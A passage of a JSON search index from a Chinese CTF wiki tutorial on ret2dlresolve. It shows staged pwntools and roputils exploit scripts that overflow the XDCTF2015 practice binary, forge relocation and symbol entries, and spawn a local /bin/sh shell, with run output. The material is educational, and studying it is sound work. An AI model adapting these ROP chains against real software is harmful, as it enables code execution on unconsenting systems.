            "text": "\u8fd9\u91cc\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u7684\u662f\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\uff0c\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u76f4\u63a5\u6267\u884cwrite\u51fd\u6570\u3002\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u91c7\u7528\u4e00\u4e2a\u66f4\u52a0\u590d\u6742\u7684\u529e\u6cd5\uff0c\u5373\u4f7f\u7528\u6808\u8fc1\u79fb\u7684\u6280\u5de7\uff0c\u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u6765\u63a7\u5236write\u51fd\u6570\u3002\u5373\u4e3b\u8981\u5206\u4e3a\u4e24\u6b65   \u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u3002  \u63a7\u5236write\u51fd\u6570\u8f93\u51fa\u76f8\u5e94\u5b57\u7b26\u4e32\u3002   \u8fd9\u91cc\u4e3b\u8981\u4f7f\u7528\u4e86pwntools\u4e2d\u7684ROP\u6a21\u5757\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack pivoting to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack pivoting, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write cmd= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  rop . write ( 1 ,   base_stage   +   80 ,   len ( sh ))  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u7ed3\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python stage1.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  120912  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 1"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-2", 
            "text": "\u5728\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u4f1a\u5229\u7528dlresolve\u76f8\u5173\u7684\u77e5\u8bc6\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u5229\u7528plt[0]\u4e2d\u7684\u76f8\u5173\u6307\u4ee4\uff0c\u5373push linkmap\u4ee5\u53ca\u8df3\u8f6c\u5230dl_resolve\u51fd\u6570\u4e2d\u89e3\u6790\u7684\u6307\u4ee4\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u5f97\u5355\u72ec\u63d0\u4f9b\u4e00\u4e2awrite\u91cd\u5b9a\u4f4d\u9879\u5728plt\u8868\u4e2d\u7684\u504f\u79fb\u3002  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack pivoting to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack pivoting, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write cmd= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  write_index   =   ( elf . plt [ write ]   -   plt0 )   /   16   -   1  write_index   *=   8  rop . raw ( plt0 )  rop . raw ( write_index )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( 1 )  rop . raw ( base_stage   +   80 )  rop . raw ( len ( sh ))  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u6548\u679c\u5982\u4e0b\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86cmd\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002  \u279c  ret2dlresolve git: ( master )  \u2717 python stage2.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  123406  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 2"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-3", 
            "text": "\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u540c\u6837\u63a7\u5236dl_resolve\u51fd\u6570\u4e2d\u7684index_offset\u53c2\u6570\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u63a7\u5236\u5176\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684write\u91cd\u5b9a\u4f4d\u9879\u3002  \u9274\u4e8epwntools\u672c\u8eab\u5e76\u4e0d\u652f\u6301\u5bf9\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u4fe1\u606f\u7684\u83b7\u53d6\u3002\u8fd9\u91cc\u6211\u4eec\u624b\u52a8\u770b\u4e00\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 readelf -r main  \n\n\u91cd\u5b9a\u4f4d\u8282  .rel.dyn  \u4f4d\u4e8e\u504f\u79fb\u91cf 0x318 \u542b\u6709  3  \u4e2a\u6761\u76ee\uff1a\n \u504f\u79fb\u91cf     \u4fe1\u606f    \u7c7b\u578b              \u7b26\u53f7\u503c      \u7b26\u53f7\u540d\u79f0\n08049ffc   00000306  R_386_GLOB_DAT     00000000    __gmon_start__\n0804a040   00000905  R_386_COPY        0804a040   stdin@GLIBC_2.0\n0804a044   00000705  R_386_COPY        0804a044   stdout@GLIBC_2.0\n\n\u91cd\u5b9a\u4f4d\u8282  .rel.plt  \u4f4d\u4e8e\u504f\u79fb\u91cf 0x330 \u542b\u6709  5  \u4e2a\u6761\u76ee\uff1a\n \u504f\u79fb\u91cf     \u4fe1\u606f    \u7c7b\u578b              \u7b26\u53f7\u503c      \u7b26\u53f7\u540d\u79f0\n0804a00c   00000107  R_386_JUMP_SLOT    00000000    setbuf@GLIBC_2.0\n0804a010   00000207  R_386_JUMP_SLOT    00000000    read@GLIBC_2.0\n0804a014   00000407  R_386_JUMP_SLOT    00000000    strlen@GLIBC_2.0\n0804a018   00000507  R_386_JUMP_SLOT    00000000    __libc_start_main@GLIBC_2.0\n0804a01c   00000607  R_386_JUMP_SLOT    00000000    write@GLIBC_2.0  \u53ef\u4ee5\u770b\u51fawrite\u7684\u91cd\u5b9a\u8868\u9879\u7684r_offset=0x0804a01c\uff0cr_info=0x00000607\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack pivoting to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack pivoting, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write sh= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  rel_plt   =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr  ## making base_stage+24 ---  fake reloc  index_offset   =   base_stage   +   24   -   rel_plt  write_got   =   elf . got [ write ]  r_info   =   0x607  rop . raw ( plt0 )  rop . raw ( index_offset )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( 1 )  rop . raw ( base_stage   +   80 )  rop . raw ( len ( sh ))  rop . raw ( write_got )    # fake reloc  rop . raw ( r_info )  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u6700\u540e\u7ed3\u679c\u5982\u4e0b\uff0c\u8fd9\u6b21\u6211\u4eec\u5728bss\u6bb5\u4f2a\u9020\u4e86\u4e00\u4e2a\u5047\u7684write\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002  \u279c  ret2dlresolve git: ( master )  \u2717 python stage3.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  126063  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 3"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-4", 
            "text": "stage3\u4e2d\uff0c\u6211\u4eec\u63a7\u5236\u4e86\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u5185\u5bb9\u4e0ewrite\u539f\u6765\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u4e00\u81f4\uff0c\u8fd9\u6b21\uff0c\u6211\u4eec\u5c06\u6784\u9020\u5c5e\u4e8e\u6211\u4eec\u81ea\u5df1\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5e76\u4e14\u4f2a\u9020\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u7b26\u53f7\u3002\u9996\u5148\uff0c\u6211\u4eec\u6839\u636ewrite\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info=0x607\u53ef\u4ee5\u77e5\u9053\uff0cwrite\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u7684\u4e0b\u6807\u4e3a0x607 8=0x6\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u77e5\u9053write\u5bf9\u5e94\u7684\u7b26\u53f7\u5730\u5740\u4e3a0x8048238\u3002  \u279c  ret2dlresolve git: ( master )  \u2717 objdump -s -EL -j  .dynsym main\n\nmain\uff1a     \u6587\u4ef6\u683c\u5f0f elf32-i386\n\nContents of section .dynsym:\n 80481d8  00000000   00000000   00000000   00000000   ................\n 80481e8  33000000   00000000   00000000   12000000    3 ...............\n 80481f8  27000000   00000000   00000000   12000000    ...............\n  8048208   52000000   00000000   00000000   20000000   R........... ...\n  8048218   20000000   00000000   00000000   12000000    ...............\n  8048228  3a000000  00000000   00000000   12000000   :...............\n  8048238  4c000000  00000000   00000000   12000000   L...............\n  8048248  2c000000 44a00408  04000000  11001a00  ,...D...........\n  8048258  0b000000 3c860408  04000000   11001000   .... ...........\n  8048268  1a000000 40a00408  04000000  11001a00  ....@...........  \u8fd9\u91cc\u7ed9\u51fa\u7684\u5176\u5b9e\u662f\u5c0f\u7aef\u6a21\u5f0f\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u624b\u5de5\u8f6c\u6362\u3002\u6b64\u5916\uff0c\u6bcf\u4e2a\u7b26\u53f7\u5360\u7528\u7684\u5927\u5c0f\u4e3a16\u4e2a\u5b57\u8282\u3002  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack pivoting to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack pivoting, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write sh= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  rel_plt   =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr  dynsym   =   elf . get_section_by_name ( .dynsym ) . header . sh_addr  dynstr   =   elf . get_section_by_name ( .dynstr ) . header . sh_addr  ### making fake write symbol  fake_sym_addr   =   base_stage   +   32  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf \n                 )    # since the size of item(Elf32_Symbol) of dynsym is 0x10  fake_sym_addr   =   fake_sym_addr   +   align  index_dynsym   =   ( \n     fake_sym_addr   -   dynsym )   /   0x10    # calculate the dynsym index of write  fake_write_sym   =   flat ([ 0x4c ,   0 ,   0 ,   0x12 ])  ### making fake write relocation  ## making base_stage+24 ---  fake reloc  index_offset   =   base_stage   +   24   -   rel_plt  write_got   =   elf . got [ write ]  r_info   =   ( index_dynsym     8 )   |   0x7  fake_write_reloc   =   flat ([ write_got ,   r_info ])  rop . raw ( plt0 )  rop . raw ( index_offset )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( 1 )  rop . raw ( base_stage   +   80 )  rop . raw ( len ( sh ))  rop . raw ( fake_write_reloc )    # fake write reloc  rop . raw ( a   *   align )    # padding  rop . raw ( fake_write_sym )    # fake write symbol  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u5177\u4f53\u6548\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python stage4.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  128795  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 4"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-5", 
            "text": "\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u5728\u9636\u6bb54\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u8fdb\u4e00\u6b65\u4f7f\u5f97write\u7b26\u53f7\u7684st_name\u6307\u5411\u6211\u4eec\u81ea\u5df1\u6784\u9020\u7684\u5b57\u7b26\u4e32\u3002  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack pivoting to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack pivoting, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write sh= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  rel_plt   =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr  dynsym   =   elf . get_section_by_name ( .dynsym ) . header . sh_addr  dynstr   =   elf . get_section_by_name ( .dynstr ) . header . sh_addr  ### making fake write symbol  fake_sym_addr   =   base_stage   +   32  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf \n                 )    # since the size of item(Elf32_Symbol) of dynsym is 0x10  fake_sym_addr   =   fake_sym_addr   +   align  index_dynsym   =   ( \n     fake_sym_addr   -   dynsym )   /   0x10    # calculate the dynsym index of write  ## plus 10 since the size of Elf32_Sym is 16.  st_name   =   fake_sym_addr   +   0x10   -   dynstr  fake_write_sym   =   flat ([ st_name ,   0 ,   0 ,   0x12 ])  ### making fake write relocation  ## making base_stage+24 ---  fake reloc  index_offset   =   base_stage   +   24   -   rel_plt  write_got   =   elf . got [ write ]  r_info   =   ( index_dynsym     8 )   |   0x7  fake_write_reloc   =   flat ([ write_got ,   r_info ])  rop . raw ( plt0 )  rop . raw ( index_offset )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( 1 )  rop . raw ( base_stage   +   80 )  rop . raw ( len ( sh ))  rop . raw ( fake_write_reloc )    # fake write reloc  rop . raw ( a   *   align )    # padding  rop . raw ( fake_write_sym )    # fake write symbol  rop . raw ( write \\x00 )    # there must be a \\x00 to mark the end of string  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u6548\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python stage5.py       [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  129249  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 5"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-6", 
            "text": "\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06\u539f\u5148\u7684write\u5b57\u7b26\u4e32\u4fee\u6539\u4e3asystem\u5b57\u7b26\u4e32\uff0c\u540c\u65f6\u4fee\u6539write\u7684\u53c2\u6570\u4e3asystem\u7684\u53c2\u6570\u5373\u53ef\u83b7\u53d6shell\u3002\u8fd9\u662f\u56e0\u4e3a\uff0cdl_resolve\u6700\u7ec8\u4f9d\u8d56\u7684\u662f\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u5373\u4f7f\u6211\u4eec\u7ed9\u4e86\u4e00\u4e2a\u5047\u7684\u5b57\u7b26\u4e32\u5b83\u4ecd\u7136\u4f1a\u53bb\u89e3\u6790\u5e76\u6267\u884c\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack pivoting to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack pivoting, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write sh= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  rel_plt   =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr  dynsym   =   elf . get_section_by_name ( .dynsym ) . header . sh_addr  dynstr   =   elf . get_section_by_name ( .dynstr ) . header . sh_addr  ### making fake write symbol  fake_sym_addr   =   base_stage   +   32  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf \n                 )    # since the size of item(Elf32_Symbol) of dynsym is 0x10  fake_sym_addr   =   fake_sym_addr   +   align  index_dynsym   =   ( \n     fake_sym_addr   -   dynsym )   /   0x10    # calculate the dynsym index of write  ## plus 10 since the size of Elf32_Sym is 16.  st_name   =   fake_sym_addr   +   0x10   -   dynstr  fake_write_sym   =   flat ([ st_name ,   0 ,   0 ,   0x12 ])  ### making fake write relocation  ## making base_stage+24 ---  fake reloc  index_offset   =   base_stage   +   24   -   rel_plt  write_got   =   elf . got [ write ]  r_info   =   ( index_dynsym     8 )   |   0x7  fake_write_reloc   =   flat ([ write_got ,   r_info ])  rop . raw ( plt0 )  rop . raw ( index_offset )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( base_stage   +   82 )  rop . raw ( bbbb )  rop . raw ( bbbb )  rop . raw ( fake_write_reloc )    # fake write reloc  rop . raw ( a   *   align )    # padding  rop . raw ( fake_write_sym )    # fake write symbol  rop . raw ( system \\x00 )    # there must be a \\x00 to mark the end of string  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  print   rop . dump ()  print   len ( rop . chain ())  rop . raw ( sh   +   \\x00 )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211'/bin/sh'\u7684\u504f\u79fb\u6211\u4fee\u6539\u4e3a\u4e8682\uff0c\u8fd9\u662f\u56e0\u4e3apwntools\u4e2d\u5b83\u4f1a\u81ea\u52a8\u5e2e\u4f60\u5bf9\u9f50\u5b57\u7b26\u4e32\u3002\u3002\u3002\u4e0b\u9762\u8fd9\u4e00\u884c\u8bf4\u660e\u4e86\u95ee\u9898\u3002  0x0050:            aara   \u6548\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python stage6.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  130415  [ * ]  Loaded cached gadgets  for   ./main \n0x0000:        0x8048380\n0x0004:           0x2528\n0x0008:            bbbb   bbbb \n0x000c:        0x804a892\n0x0010:            bbbb   bbbb \n0x0014:            bbbb   bbbb \n0x0018:  \\x1c\\xa0\\x04\\x08   \\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00 \n0x001c:   \\x07i\\x02\\x00 \n0x0020:            aaaa   aaaaaaaa \n0x0024:            aaaa \n0x0028:   \\x00 \\x00\\x00   \\x00 \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00 \n0x002c:  \\x00\\x00\\x00\\x00 \n0x0030:  \\x00\\x00\\x00\\x00 \n0x0034:  \\x12\\x00\\x00\\x00 \n0x0038:            syst   system\\x00 \n0x003c:         em\\x00o \n0x0040:              aa \n0x0044:            aaaa   aaaaaaaaaaaaaa \n0x0048:            aaaa \n0x004c:            aaaa \n0x0050:            aara  82  [ * ]  Switching to interactive mode\n/bin/sh:  1 : xa: not found\n$ ls\ncore  main.c     stage2.py  stage4.py  stage6.py\nmain  stage1.py  stage3.py  stage5.py", 
            "title": "stage 6"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_5", 
            "text": "\u6839\u636e\u4e0a\u9762\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5e94\u8be5\u5f88\u5bb9\u6613\u53ef\u4ee5\u7406\u89e3\u8fd9\u4e2a\u653b\u51fb\u4e86\u3002\u4e0b\u9762\u6211\u4eec\u76f4\u63a5\u4f7f\u7528roputil\u6765\u8fdb\u884c\u653b\u51fb\u3002\u4ee3\u7801\u5982\u4e0b  from   roputils   import   *  from   pwn   import   process  from   pwn   import   gdb  from   pwn   import   context  r   =   process ( ./main )  context . log_level   =   debug  r . recv ()  rop   =   ROP ( ./main )  offset   =   112  bss_base   =   rop . section ( .bss )  buf   =   rop . fill ( offset )  buf   +=   rop . call ( read ,   0 ,   bss_base ,   100 )  ## used to call dl_Resolve()  buf   +=   rop . dl_resolve_call ( bss_base   +   20 ,   bss_base )  r . send ( buf )  buf   =   rop . string ( /bin/sh )  buf   +=   rop . fill ( 20 ,   buf )  ## used to make faking data, such relocation, Symbol, Str  buf   +=   rop . dl_resolve_data ( bss_base   +   20 ,   system )  buf   +=   rop . fill ( 100 ,   buf )  r . send ( buf )  r . interactive ()   \u5173\u4e8edl_resolve_call\u4e0edl_resolve_data\u7684\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003roputils.py\u7684\u6e90\u7801\uff0c\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cdl_resolve\u6267\u884c\u5b8c\u4e4b\u540e\u4e5f\u662f\u9700\u8981\u6709\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\u7684\u3002  \u6548\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python roptool.py                        [ + ]  Starting  local  process  ./main : pid  6114  [ DEBUG ]  Received 0x17 bytes:\n     Welcome to XDCTF2015~!\\n  [ DEBUG ]  Sent 0x94 bytes:\n     00000000    46  4c  68   78    52   36   67  6e   65   47   53   58    71   77   51   49   \u2502FLhx\u2502R6gn\u2502eGSX\u2502qwQI\u2502\n     00000010    32   43  6c  49    77   76   51   33    47   49  4a  59    50   74  6c  38   \u25022ClI\u2502wvQ3\u2502GIJY\u2502Ptl8\u2502\n     00000020    57   54   68  4a   63   48   39   62    46   55   52   58    50   73   38   64   \u2502WThJ\u2502cH9b\u2502FURX\u2502Ps8d\u2502\n     00000030    72  4c  38   63    50   79   37   73    55   45  7a  32   6f  59  5a  42   \u2502rL8c\u2502Py7s\u2502UEz2\u2502oYZB\u2502\n     00000040    76   59   32   43    74   75   77  6f   70   56   61   44   6a  73   35  6b  \u2502vY2C\u2502tuwo\u2502pVaD\u2502js5k\u2502\n     00000050    41   77   78   77    49   72  7a  49    70  4d  31   67    52  6f  44  6f  \u2502Awxw\u2502IrzI\u2502pM1g\u2502RoDo\u2502\n     00000060    43   44   43  6e   45   31   50   48    53   73   64   30   6d  54  7a 5a  \u2502CDCn\u2502E1PH\u2502Ssd0\u2502mTzZ\u2502\n     00000070   a0  83   04   08    19   86   04   08    00   00   00   00    40  a0  04   08   \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502@\u00b7\u00b7\u00b7\u2502\n     00000080    64   00   00   00    80   83   04   08    28  1d  00   00    79   83   04   08   \u2502d\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 ( \u00b7\u00b7\u00b7\u2502y\u00b7\u00b7\u00b7\u2502\n     00000090    40  a0  04   08                                          \u2502@\u00b7\u00b7\u00b7\u2502\u2502\n     00000094  [ DEBUG ]  Sent 0x64 bytes:\n     00000000   2f  62   69  6e  2f  73   68   00    73   52   46   66    57   43   59   52   \u2502/bin\u2502/sh\u00b7\u2502sRFf\u2502WCYR\u2502\n     00000010    66  4c  35   52    78   49  4c  53    54  a0  04   08    07  e9  01   00   \u2502fL5R\u2502xILS\u2502T\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n     00000020   6e 6b  45   32    52   76   73  6c   00  1e  00   00    00   00   00   00   \u2502nkE2\u2502Rvsl\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n     00000030    00   00   00   00    12   00   00   00    73   79   73   74    65  6d  00   74   \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502syst\u2502em\u00b7t\u2502\n     00000040   5a 4f 4e 6c  6c  73  4b 5a   76   53   48  6e   38   37   49   47   \u2502ZONl\u2502lsKZ\u2502vSHn\u250287IG\u2502\n     00000050    69   49   52  6c   50   44   38   67    45   77   75  6c   72   47  6f  67   \u2502iIRl\u2502PD8g\u2502Ewul\u2502rGog\u2502\n     00000060    55   41   52  4f                                         \u2502UARO\u2502\u2502\n     00000064  [ * ]  Switching to interactive mode\n$ ls [ DEBUG ]  Sent 0x3 bytes:\n     ls\\n  [ DEBUG ]  Received 0x8d bytes:\n     core\\t     main    roptool.py   roputils.pyc\\tstage2.py  stage4.py  stage6.py\\n \n     __init__.py  main.c  roputils.py  stage1.py\\tstage3.py  stage5.py\\n \ncore         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py\n__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py", 
            "title": "\u5de5\u5177\u653b\u51fb"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_6", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#srop", 
            "text": "", 
            "title": "SROP"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_7", 
